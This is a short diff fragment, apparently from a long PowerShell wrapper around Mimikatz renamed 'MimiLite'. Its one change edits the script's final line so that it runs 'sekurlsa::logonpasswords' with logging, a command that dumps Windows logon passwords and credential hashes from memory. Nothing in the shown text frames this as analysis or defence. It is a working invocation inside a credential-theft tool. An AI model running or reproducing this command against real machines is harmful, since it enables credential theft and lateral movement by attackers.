@@ -2633,4 +2633,4 @@ Function Main
 }
 Main
 }
-MimiLite -ExeArgs "sekurlsa::logonpasswords exit"
+MimiLite -ExeArgs "log sekurlsa::logonpasswords exit"
